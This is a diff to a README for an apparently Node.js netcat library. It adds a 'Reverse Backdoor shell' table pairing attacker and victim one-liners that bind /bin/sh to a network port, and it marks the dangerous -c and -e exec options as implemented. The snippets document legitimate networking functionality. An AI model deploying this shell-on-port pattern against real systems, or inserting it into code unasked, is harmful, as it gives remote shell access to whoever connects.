@@ -98,6 +98,10 @@ The `exec()` method execute the given command and pipe together his `stdout` and
 
 #### Reverse Backdoor shell
 
+| Attacker              | Victim                           |
+|---------------------|------------------------------------|
+|`nc.port(2389).listen().exec('/bin/sh')`|`process.stdin.pipe(nc2.port(2389).retry(5000).connect().pipe(process.stdout))`|
+
 TODO...
 
 #### Netcat as a proxy
@@ -169,8 +173,8 @@ Example:
 Available options:
 
 
-- [ ] `-c shell commands    as '-e'; use /bin/sh to exec [dangerous!!]`
-- [ ] `-e filename          program to exec after connect [dangerous!!]`
+- [x] `-c shell commands    as '-e'; use /bin/sh to exec [dangerous!!]`
+- [x] `-e filename          program to exec after connect [dangerous!!]`
 - [ ] `-b                   allow broadcasts`
 - [ ] `-g gateway           source-routing hop point[s], up to 8`
 - [ ] `-G num               source-routing pointer: 4, 8, 12`
